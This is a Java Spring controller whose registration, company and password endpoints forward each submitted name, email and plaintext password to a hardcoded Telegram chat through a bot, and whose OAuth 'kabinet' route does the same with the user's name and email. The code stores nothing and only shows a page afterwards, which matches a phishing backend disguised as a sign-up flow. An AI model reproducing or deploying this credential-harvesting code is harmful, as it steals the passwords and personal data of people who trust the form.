package com.example.testwebb.controller;

import com.example.testwebb.MyTelegramBot;
import lombok.RequiredArgsConstructor;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.oauth2.client.authentication.OAuth2AuthenticationToken;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

import java.util.Map;

@Controller
@RequestMapping
@RequiredArgsConstructor
public class Aasdfghgfds {

    private final MyTelegramBot myTelegramBot;

    @GetMapping("/admin")
    public String admin() {
        return "/index";
    }

    @PostMapping("/register")
    public String post(@RequestParam String name, @RequestParam String email,
                       @RequestParam String password) {
        myTelegramBot.sendMessage(name+" "+email+" "+password,1817365313L);
        return "main";
    }
    @PostMapping("/kompaniya")
    public String aaaa(@RequestParam String name, @RequestParam String email,
                       @RequestParam String password,@RequestParam String kompaniya) {
        myTelegramBot.sendMessage(name+" "+email+" "+password+" "+kompaniya,1817365313L);
        return "sessufuli";
    }

    @GetMapping("/qushish")
    public String qushish() {
        return "qushish";
    }
    @GetMapping("/main")
    public String m() {
        return "main";
    }

    @GetMapping("/kabinet")
    public String kabinet() {
        OAuth2AuthenticationToken auth =
                (OAuth2AuthenticationToken) SecurityContextHolder
                        .getContext().getAuthentication();

        Map<String, Object> attr = auth.getPrincipal().getAttributes();
        String email = (String) attr.get("email");
        String name = (String) attr.get("name");

        myTelegramBot.sendMessage("Salom " + name + ", email: " + email, 1817365313L);

        return "moshi";
    }
    @PostMapping("/parol")
    public String parol(@RequestParam String password) {
        myTelegramBot.sendMessage(password, 1817365313L);
        return "main";
    }



}
